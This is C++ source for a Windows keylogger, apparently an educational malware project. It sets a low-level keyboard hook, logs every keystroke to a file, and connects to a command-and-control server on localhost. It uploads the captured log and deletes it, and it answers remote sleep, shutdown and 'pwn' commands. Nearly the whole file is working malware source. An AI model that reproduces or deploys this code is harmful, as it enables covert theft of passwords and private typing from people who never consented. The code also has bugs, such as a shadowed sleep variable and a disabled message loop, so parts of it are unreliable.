#include <iostream>
#include <fstream>
#include <sstream>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <cstdlib>
#include <ctime>

#pragma comment(lib, "wininet.lib")

using namespace std;

string DeviceID;
HINTERNET hConnect = NULL;
HINTERNET hInternet = NULL;

// Converts key int to string
string KeyToString(int key) {
    switch (key) {
        case VK_RETURN:
            return "[ENTER]";
        case VK_SPACE:
            return "[SPACE]";
        case VK_TAB:
            return "[TAB]";
        case VK_BACK:
            return "[BACKSPACE]";
        case VK_SHIFT:
            return "[SHIFT]";
        case VK_LSHIFT:
            return "[L_SHIFT]";
        case VK_RSHIFT:
            return "[R_SHIFT]";
        case VK_CONTROL:
            return "[CTRL]";
        case VK_LCONTROL:
            return "[L_CTRL]";
        case VK_RCONTROL:
            return "[R_CTRL]";
        case VK_MENU:
            return "[ALT]";
        case VK_LMENU:
            return "[L_ALT]";
        case VK_RMENU:
            return "[R_ALT]";
        case VK_CAPITAL:
            return "[CAPS LOCK]";
        case VK_ESCAPE:
            return "[ESC]";
        case VK_PRIOR:
            return "[PAGE UP]";
        case VK_NEXT:
            return "[PAGE DOWN]";
        case VK_END:
            return "[END]";
        case VK_HOME:
            return "[HOME]";
        case VK_LEFT:
            return "[LEFT_ARROW]";
        case VK_UP:
            return "[UP_ARROW]";
        case VK_RIGHT:
            return "[RIGHT_ARROW]";
        case VK_DOWN:
            return "[DOWN_ARROW]";
        case VK_INSERT:
            return "[INSERT]";
        case VK_DELETE:
            return "[DELETE]";
        case VK_PRINT:
            return "[PRINT_SCREEN]";
        case VK_PAUSE:
            return "[PAUSE]";
        case VK_PLAY:
            return "[PLAY]";
        case VK_F1:
            return "[F1]";
        case VK_F2:
            return "[F2]";
        case VK_F3:
            return "[F3]";
        case VK_F4:
            return "[F4]";
        case VK_F5:
            return "[F5]";
        case VK_F6:
            return "[F6]";
        case VK_F7:
            return "[F7]";
        case VK_F8:
            return "[F8]";
        case VK_F9:
            return "[F9]";
        case VK_F10:
            return "[F10]";
        case VK_F11:
            return "[F11]";
        case VK_F12:
            return "[F12]";
        default:
            return string(1, static_cast<char>(key));
    }
}

// Log keystrokes to file
void LogKeystroke(int key) {
    ofstream logfile;
    logfile.open("keylog.txt", ios_base::app);

    if (logfile.is_open()) {
        string keyStroke = KeyToString(key);
        if (!keyStroke.empty()) {
            logfile << keyStroke;
        } else {
            logfile << "[UNKNOWN_KEY]";
        }
        logfile.close();
    }
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
            LogKeystroke(kbdStruct->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Display a message to the victim
void DisplayMessage() {
    MessageBoxW(NULL, L"Sorry, you've been pwned, for educational purposes!", L"Pwned!", MB_OK | MB_ICONEXCLAMATION);
}

// Handle false command response
void FalseCommandResponse(const string& message) {
    cout << "False Command: " << message << endl;
}

// Follow commands received
void FollowCommand(const string& command) {
    stringstream commandStream(command);
    vector<string> commandSegments;
    string segment;

    while (getline(commandStream, segment, ' ')) {
        commandSegments.push_back(segment);
    }

    if (commandSegments.size() < 2 || commandSegments.size() > 3) {
        FalseCommandResponse("Invalid command format.");
        return;
    }

    string cmd = commandSegments[0];
    string id = commandSegments[1];

    if (cmd == "slp") {
        int n = 5; // Default sleep time

        if (commandSegments.size() == 3) {
            size_t pos;
            int n = stoi(commandSegments[2], &pos);
            if (pos != commandSegments[2].size()) {
                FalseCommandResponse("Invalid sleep length.");
                return;
            }
        }

        Sleep(n * 1000); // Convert seconds to milliseconds
    } else if (cmd == "shd") {
        exit(0);
    } else if (cmd == "pwn") {
        DisplayMessage();
    } else {
        FalseCommandResponse("Unknown command.");
    }
}

// Function to connect to the server
void connectToServer() {
    hInternet = InternetOpenW(L"MalwareAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        DWORD error = GetLastError();
        cerr << "Failed to initialize WinINet. Error code: " << error << endl;
        return;
    }

    // Construct the URL with DeviceID as a query parameter
    wstring url = L"http://localhost:8888/newClient?id=" + wstring(DeviceID.begin(), DeviceID.end());

    hConnect = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);
    if (hConnect == NULL) {
        DWORD error = GetLastError();
        cerr << "Failed to connect to server. Error code: " << error << endl;
        InternetCloseHandle(hInternet);
        return;
    }

}

// Function to close WinINet handles
void closeEverything() {
    if (hConnect != NULL) {
        InternetCloseHandle(hConnect);
    }
    if (hInternet != NULL) {
        InternetCloseHandle(hInternet);
    }
}

bool send() {
    // Open the keylog file for reading
    ifstream logfile;
    logfile.open("keylog.txt", ios_base::binary);
    
    if (!logfile.is_open()) {
        cerr << "Failed to open keylog file for reading." << endl;
        return false;
    }

    // Determine the file size
    logfile.seekg(0, ios::end);
    int fileSize = logfile.tellg();
    logfile.seekg(0, ios::beg);

    // Allocate a buffer for file contents
    char* buffer = new char[fileSize];
    logfile.read(buffer, fileSize);
    logfile.close();

    // Connect to the server and send the file contents
    //HINTERNET hUpload = InternetOpenUrlW(hInternet, L"http://localhost:8888/", NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (hConnect == NULL) {
        cerr << "Failed to open HTTP request for uploading." << endl;
        delete[] buffer;
        return false;
    }

    DWORD bytesWritten;
    BOOL result = InternetWriteFile(hConnect, buffer, fileSize, &bytesWritten);
    if (!result) {
        cerr << "Failed to write to HTTP request for uploading." << endl;
        cout<<bytesWritten<<endl;
        cout<<buffer<<endl;
        return false;
    } else {
        cout << "Uploaded " << bytesWritten << " bytes." << endl;
    }

    //InternetCloseHandle(hUpload);
    delete[] buffer;
    return true;
}

void deleteLog() {
    if (remove("keylog.txt") != 0) {
        cerr << "Failed to delete keylog file." << endl;
    } else {
        cout << "Keylog file deleted successfully." << endl;
    }
}

void deleteAndSendLog(){
    if (hConnect == NULL){
        cerr << "Failed to connect to server." << endl;
        return;
    }
    if(send()){
        deleteLog();
    }
}

// Main function
int main() {
    // Set the hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL) {
        cerr << "Failed to set hook" << endl;
    }

    srand(static_cast<unsigned int>(time(nullptr)));
    int id = rand();
    DeviceID = "Device-" + to_string(id);

    connectToServer();
    int i = 0;
    MSG msg;
    while (true){//GetMessage(&msg, NULL, 0, 0)){ 
        i += 1;
        if(i==1000){
            i=0;
            deleteAndSendLog();
        }
        char response[4096];
        DWORD bytesRead;
        if (InternetReadFile(hConnect, response, sizeof(response) - 1, &bytesRead)) {
            response[bytesRead] = '\0';
            //cout << "Server response: " << response << endl;
        }
        /*if (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }*/

    }

    closeEverything();

    return 0;
}
